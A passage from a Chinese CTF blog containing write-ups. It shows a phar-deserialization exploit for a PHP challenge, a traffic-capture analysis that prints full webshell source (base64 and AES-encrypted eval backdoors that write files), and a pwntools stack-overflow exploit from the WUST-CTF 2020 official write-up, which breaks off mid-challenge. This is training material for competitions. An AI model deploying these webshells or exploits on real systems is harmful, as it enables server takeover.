<span class="hljs-variable">$name</span> = <span class="hljs-variable">$file_name</span>;<br> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$name</span>)) &#123;<br> @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$name</span>);<br> <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$name</span>)) &#123;<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p align=\&quot;center\&quot; style=\&quot;font-weight: bold;\&quot;&gt;成功删除! 3s后跳转&lt;/p&gt;&quot;</span>;<br> <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;refresh:3;url=view.php&quot;</span>);<br> &#125; <span class="hljs-keyword">else</span> &#123;<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Can not delete!&quot;</span>;<br> <span class="hljs-keyword">exit</span>;<br> &#125;<br> &#125; <span class="hljs-keyword">else</span> &#123;<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p align=\&quot;center\&quot; style=\&quot;font-weight: bold;\&quot;&gt;找不到这个文件! &lt;/p&gt;&quot;</span>;<br> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里有一个 <code>file_exists</code> 可以利用，而且最后还会进行代码执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br> <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;cmd);<br>&#125;<br></code></pre></td></tr></table></figure><p>虽然 <code>upload.php</code> 没有什么利用点，但是可以看到黑名单</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/(scandir)|(end)|(implode)|(eval)|(system)|(passthru)|(exec)|(chroot)|(chgrp)|(chown)|(shell_exec)|(proc_open)|(proc_get_status)|(ini_alter)|(ini_set)|(ini_restore)|(dl)|(pfsockopen)|(symlink)|(popen)|(putenv)|(syslog)|(readlink)|(stream_socket_server)|(error_log)/i&#x27;</span>, <span class="hljs-variable">$content</span>)<br></code></pre></td></tr></table></figure><p>我们可以用 <code>show_source()</code> 函数把 <code>flag.php</code> 读一下，而且 <code>phar</code> 可以直接上传，那我们先构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">View</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$dir</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span>;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;cmd = <span class="hljs-string">&#x27;show_source(&quot;flag.php&quot;);&#x27;</span>;<br>        &#125;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;cmd);<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;phar.phar&#x27;</span>);<br>    <span class="hljs-variable">$phar</span> -&gt; <span class="hljs-title function_ invoke__">startBuffering</span>();<br>    <span class="hljs-variable">$phar</span> -&gt; <span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;GIF89a&#x27;</span>.<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);   <span class="hljs-comment">//设置stub，增加gif文件头</span><br>    <span class="hljs-variable">$phar</span> -&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&#x27;test.txt&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);  <span class="hljs-comment">//添加要压缩的文件</span><br>    <span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">View</span>();<br>    <span class="hljs-variable">$phar</span> -&gt; <span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$object</span>);  <span class="hljs-comment">//将自定义meta-data存入manifest</span><br>    <span class="hljs-variable">$phar</span> -&gt; <span class="hljs-title function_ invoke__">stopBuffering</span>();<br>    <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>exp 的模板，有时候限制 gif 的话可以增加 <code>gif</code> 头，生成 <code>phar</code> 文件后，直接上传。</p><p><img src="https://img.tucang.cc/api/image/show/4a5affb4024b2251fd9864cca871e39a" alt="image-20200527212700287"></p><p>我们可以知道，要通过 <code>delete</code> 这个参数来触发 <code>file_exists</code> 才可以利用 <code>phar</code>，因此构造参数 <code>detele=phar://phar.phar</code>包含一下，就可以得到flag了。</p><p><code>WHUCTF&#123;Phar_1s_Very_d@nger0u5&#125;</code></p><h1 id="shellofAWD"><a href="#shellofAWD" class="headerlink" title="shellofAWD"></a>shellofAWD</h1><p>这题是一个流量包，听名字应该是在打 AD 时的流量包，打开流量包很快就可以发现🐎，并且还可以看到靶机的 ip，筛选一下进行分析。</p><p><img src="https://img.tucang.cc/api/image/show/89625b98c3cbfa060fa3a34924ea999f" alt="image-20200527213132020"></p><p>后来跟踪下一个 tcp 流，发现送了一堆参数</p><p><img src="https://img.tucang.cc/api/image/show/8b08a2fa415c0b1354f6aa29254e8bcd" alt="image-20200527213230184"></p><p>base64解码ant参数得到</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">eval</span>(base64_decode($_POST[_0x6aa401ad3c537]));<span class="hljs-built_in">die</span>();<br></code></pre></td></tr></table></figure><p>再看看 <code>_0x6aa401ad3c537</code> 的参数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-string">&quot;0&quot;</span>);<br>@<span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">asenc</span>(<span class="hljs-params"><span class="hljs-variable">$out</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$out</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">asoutput</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>();<br>    <span class="hljs-title function_ invoke__">ob_end_clean</span>();<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;2e0ebea5592&quot;</span>;<br>    <span class="hljs-keyword">echo</span> @<span class="hljs-title function_ invoke__">asenc</span>(<span class="hljs-variable">$output</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;62e800a0&quot;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">ob_start</span>();<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-variable">$D</span> = <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;SCRIPT_FILENAME&quot;</span>]);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$D</span> == <span class="hljs-string">&quot;&quot;</span>) &#123;<br>        <span class="hljs-variable">$D</span> = <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;PATH_TRANSLATED&quot;</span>]);<br>    &#125;<br>    <span class="hljs-variable">$R</span> = <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$D&#125;</span>\t&quot;</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$D</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>) != <span class="hljs-string">&quot;/&quot;</span>) &#123;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-title function_ invoke__">range</span>(<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;Z&quot;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$L</span>) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-string">&quot;<span class="hljs-subst">&#123;$L&#125;</span>:&quot;</span>)) &#123;<br>                <span class="hljs-variable">$R</span> .= <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$L&#125;</span>:&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$R</span> .= <span class="hljs-string">&quot;/&quot;</span>;<br>    &#125;<br>    <span class="hljs-variable">$R</span> .= <span class="hljs-string">&quot;\t&quot;</span>;<br>    <span class="hljs-variable">$u</span> = <span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&quot;posix_getegid&quot;</span>) ? @<span class="hljs-title function_ invoke__">posix_getpwuid</span>(@<span class="hljs-title function_ invoke__">posix_geteuid</span>()) : <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-variable">$s</span> = <span class="hljs-variable">$u</span> ? <span class="hljs-variable">$u</span>[<span class="hljs-string">&quot;name&quot;</span>] : @<span class="hljs-title function_ invoke__">get_current_user</span>();<br>    <span class="hljs-variable">$R</span> .= <span class="hljs-title function_ invoke__">php_uname</span>();<br>    <span class="hljs-variable">$R</span> .= <span class="hljs-string">&quot;\t<span class="hljs-subst">&#123;$s&#125;</span>&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$R</span>;<br>&#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ERROR://&quot;</span> . <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>();<br>&#125;<br><span class="hljs-title function_ invoke__">asoutput</span>();<br><span class="hljs-keyword">die</span>;<br></code></pre></td></tr></table></figure><p>当然，可以看到其实并没有什么用，可能就测试一下功能，不过大概知道了他传东西的套路了，看到 <code>tcp.stream eq 3</code> 时，发现了</p><p><img src="https://img.tucang.cc/api/image/show/ba566ba0b1f09819682dbc13787fb2dd" alt="image-20200527213650249"></p><p>拿到了比较关键的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-string">&quot;0&quot;</span>);<br>@<span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">asenc</span>(<span class="hljs-params"><span class="hljs-variable">$out</span></span>) </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$out</span>;<br>&#125;<br>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">asoutput</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-variable">$output</span>=<span class="hljs-title function_ invoke__">ob_get_contents</span>();<br><span class="hljs-title function_ invoke__">ob_end_clean</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;17dc23&quot;</span>;<br><span class="hljs-keyword">echo</span> @<span class="hljs-title function_ invoke__">asenc</span>(<span class="hljs-variable">$output</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;f890355d3c&quot;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">ob_start</span>();<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-variable">$f</span>=<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;j6b36f516d1adf&quot;</span>]);<br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;oc86831f79ec72&quot;</span>];<br><span class="hljs-variable">$c</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$c</span>);<br><span class="hljs-variable">$c</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$c</span>);<br><span class="hljs-variable">$buf</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$c</span>);<span class="hljs-variable">$i</span>+=<span class="hljs-number">2</span>)<span class="hljs-variable">$buf</span>.=<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-string">&quot;%&quot;</span>.<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$c</span>,<span class="hljs-variable">$i</span>,<span class="hljs-number">2</span>));<br><span class="hljs-keyword">echo</span>(@<span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$f</span>,<span class="hljs-string">&quot;a&quot;</span>),<span class="hljs-variable">$buf</span>)?<span class="hljs-string">&quot;1&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>);<br>;<br>&#125;<br><span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ERROR://&quot;</span>.<span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>();<br>&#125;<br>;<br><span class="hljs-title function_ invoke__">asoutput</span>();<br><span class="hljs-keyword">die</span>();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>其中有一段解码的引起了注意，将参数里 <code>$c=$_POST[&quot;oc86831f79ec72&quot;];</code> 进行解码，可以得到：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$key</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">uniqid</span>(<span class="hljs-title function_ invoke__">rand</span>())),<span class="hljs-number">16</span>);<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>]=<span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">print</span> <span class="hljs-variable">$key</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-variable">$key</span>=<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>];<br><span class="hljs-variable">$post</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">extension_loaded</span>(<span class="hljs-string">&#x27;openssl&#x27;</span>))<br>&#123;<br><span class="hljs-variable">$t</span>=<span class="hljs-string">&quot;base64_&quot;</span>.<span class="hljs-string">&quot;decode&quot;</span>;<br><span class="hljs-variable">$post</span>=<span class="hljs-variable">$t</span>(<span class="hljs-variable">$post</span>.<span class="hljs-string">&quot;&quot;</span>);<br><br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$post</span>);<span class="hljs-variable">$i</span>++) &#123;<br>    <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$key</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>]; <br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-variable">$post</span>=<span class="hljs-title function_ invoke__">openssl_decrypt</span>(<span class="hljs-variable">$post</span>, <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-variable">$key</span>);<br>&#125;<br>    <span class="hljs-variable">$arr</span>=<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$post</span>);<br>    <span class="hljs-variable">$func</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">0</span>];<br>    <span class="hljs-variable">$params</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>];<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$p</span></span>) </span>&#123;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$p</span>.<span class="hljs-string">&quot;&quot;</span>);&#125;&#125;<br>@<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>(<span class="hljs-variable">$params</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里就是比较关键的代码了，首先传 <code>pass</code> 设置 <code>SESSION</code>，这是 <code>AES</code> 的密钥，我们查到流量包有两个传 <code>pass</code> 的，最后一个得到的 key 就是后面我们用来解密的 <code>AES</code> 密钥。<img src="https://img.tucang.cc/api/image/show/c05e934d07d4e9035852492fd7fd2528" alt="image-20200527214324885"></p><p>可以知道 <code>key</code> &#x3D; <code>91ee1bfc4fd27c90</code>，接下来就是硬解后面的流量包了。发现执行了 <code>ln -s /flag jquery.min.js</code> ，这样 <code>jquery.min.js</code> 就指向了 flag，读它就得到了flag<code>(tcp.stream eq 6)</code></p><p><img src="https://img.tucang.cc/api/image/show/68ef8008264fa16a6c82f7bb79c7dfa9" alt="image-20200527215003442"></p><p>最后在 <code>tcp.stream eq 7</code> 里的回应里解密可以得到结果的 base64，结果解码就是flag了。</p><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$post</span>=<span class="hljs-string">&quot;5U+SIO3pbt0CXFm7gLAx3xT7q0qDPFaCK8lNevS6Nrmak6Hhj9PXx3ZlGnMIgkqnqHmf6ba5VvtRMgJP6wUtoMXx5WeYJvobewjKDmZ8sSUCZJhKzzkX2ISKKy/snPv+6UOh5rBo6j/JvFGUOUjkKCbCe+nEGD9EKyv10Uu9KHU=&quot;</span>;<br><span class="hljs-variable">$key</span>=<span class="hljs-string">&quot;91ee1bfc4fd27c90&quot;</span>;<br><span class="hljs-variable">$post</span>=<span class="hljs-title function_ invoke__">openssl_decrypt</span>(<span class="hljs-variable">$post</span>, <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-variable">$key</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$post</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://img.tucang.cc/api/image/show/71c6d2fc7a2d3f1619716a99aed09458" alt="image-20200527215208860"></p><p><img src="https://img.tucang.cc/api/image/show/93c1bb0c9d0d0413d810b70f1e51d4dd" alt="image-20200527215228699"></p><p>总体来说还是挺好玩的，总结了一些思路可以回去训练新人，武大的师傅还是很强，剩下两题web也没咋看，js还是硬伤不怎么会，留个坑以后慢慢补。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WriteUps</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WUST-CTF 2020 官方 Writeup</title>
    <link href="/2020/03/30/wctf2020_official_wp/"/>
    <url>/2020/03/30/wctf2020_official_wp/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>去年12月份左右，突然彼得一激灵，想弄个萌新赛给大一大二的打打，不然大家平时都没啥机会打比赛（毕竟现在比赛都是把萌新骗进来杀，一点不友好）。然后开始想赛制，奖励，策划，出题… 经过了各种申请和修改，终于申请成功了，也就有了学校的第一个CTF。一开始没有想到会有那么多外校的师傅来打，所以在环境，题目设置上会出现一些大大小小的问题，加上题目可能对很多师傅来说太简单了，希望师傅们见谅。感谢各位师傅的捧场，你们认真做就是对出题人最好的评价。感谢各路师傅投稿的 writeup，这篇 writeup 作为官方 writeup，就以出题人的角度来写。</p><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="getshell-33-solves"><a href="#getshell-33-solves" class="headerlink" title="getshell - 33 solves"></a>getshell - 33 solves</h2><blockquote><p>Author: ColdShield</p></blockquote><p>flag:<code>wctf2020&#123;E@sy_get_shel1&#125;</code></p><p><strong>程序分析</strong></p><p><img src="https://s1.ax1x.com/2020/03/30/GndqxJ.png" alt="GndqxJ.png"></p><p>开启栈不可执行，没有 canary，PIE 保护</p><p><img src="https://s1.ax1x.com/2020/03/30/Gndza6.png" alt="Gndza6.png"></p><p>具体漏洞在<code>vulnerable</code>函数中，栈溢出，溢出<code>0x20-0x18</code>可覆盖8个字节，即刚好覆盖到返回地址，由于程序内置后门</p><p><img src="https://s1.ax1x.com/2020/03/30/GndOM9.png" alt="GndOM9.png"></p><p>返回地址设置成<code>0x0804851B</code>即可</p><p><strong>EXP</strong></p><p>和之前换乐赛一样，我的exp都是一个demo copy出来的，主要看<code># todo here</code>下面的内容就好</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> print_function<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>binary = <span class="hljs-string">&#x27;getshell&#x27;</span><span class="hljs-comment">#binary&#x27;s name here</span><br>context.binary = binary<span class="hljs-comment">#context here</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>pty = process.PTY<br>p = process(binary, aslr = <span class="hljs-number">1</span>, stdin=pty, stdout=pty)<span class="hljs-comment">#process option here</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Host =&#x27;0.0.0.0&#x27;</span><br><span class="hljs-string">Port =2333</span><br><span class="hljs-string">p = remote(Host,Port)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>elf = ELF(binary)<br>libc = elf.libc<br><br>my_u64 = <span class="hljs-keyword">lambda</span> x: u64(x.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>my_u32 = <span class="hljs-keyword">lambda</span> x: u32(x.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>global_max_fast=<span class="hljs-number">0x3c67f8</span><br>codebase = <span class="hljs-number">0x555555554000</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">loginfo</span>(<span class="hljs-params">what=<span class="hljs-string">&#x27;&#x27;</span>,address=<span class="hljs-number">0</span></span>):<br>log.info(<span class="hljs-string">&quot;\033[1;36m&quot;</span> + what + <span class="hljs-string">&#x27;-----&gt;&#x27;</span> + <span class="hljs-built_in">hex</span>(address) + <span class="hljs-string">&quot;\033[0m&quot;</span>)<br><br><span class="hljs-comment"># todo here</span><br>p.recvuntil(<span class="hljs-string">&quot;\\ \n&quot;</span>)<br>p.send(<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x18</span>+<span class="hljs-number">4</span>)+p32(<span class="hljs-number">0x0804851B</span>))<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="getshell2-7-solves"><a href="#getshell2-7-solves" class="headerlink" title="getshell2 - 7 solves"></a>getshell2 - 7 solves</h2><blockquote><p>Author: ColdShield</p></blockquote><p>flag:<code>wctf2020&#123;Sh_Als0_w0rks&#125;</code></p><p><strong>程序分析</strong></p><p><img src="https://s1.ax1x.com/2020/03/30/GndxVx.png" alt="GndxVx.png"></p><p>和前面那个程序的保护一样</p><p><img src="https://s1.ax1x.com/2020/03/30/Gndb24.png" alt="Gndb24.png"></p><p>具体漏洞在<code>vulnerable</code>函数中，栈溢出，溢出<code>0x24-0x18</code>可覆盖0xC个字节，可覆盖返回地址和函数第一个参数</p><p>但是程序的后门是这样的</p><p><img src="https://s1.ax1x.com/2020/03/30/GndHGF.png" alt="GndHGF.png"></p><p><img src="https://s1.ax1x.com/2020/03/30/Gnd7PU.png" 